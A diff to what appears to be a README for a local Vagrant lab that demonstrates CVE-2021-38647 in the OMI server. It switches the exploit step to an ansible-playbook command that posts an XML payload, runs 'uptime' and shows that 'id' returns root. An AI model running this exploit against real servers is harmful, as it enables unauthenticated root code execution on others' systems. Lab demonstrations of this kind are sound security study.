@@ -43,16 +43,16 @@ Thanks to vagrant a port forward on localhost:5986 to 5986 in the VM will be ope
 
 #### CVE-2021-38647
 
-We just need to send this xml request to a vulnerable OMI server:
+We just need to send a SOAP request to the vulberable OMI server, ansible [uri module](https://docs.ansible.com/ansible/latest/collections/ansible/builtin/uri_module.html) can be used to post this XML payload:
 
 ```shell
 cd /vagrant
-. send-payload.sh
+ansible-playbook attack-play.yml -e "rcecmd=uptime"
 ```
 
-You should see the output to `printenv` command in `<p:StdOut>`.
+You should see the output to `uptime` command in `<p:StdOut>`.
 
-If you change the command in `payload.xml` to be `id` you can see `uid=0(root) gid=0(root) groups=0(root)` outputs.
+If you change the command to be `id` you can see `uid=0(root) gid=0(root) groups=0(root)` outputs.
 
 😬😬😬
 
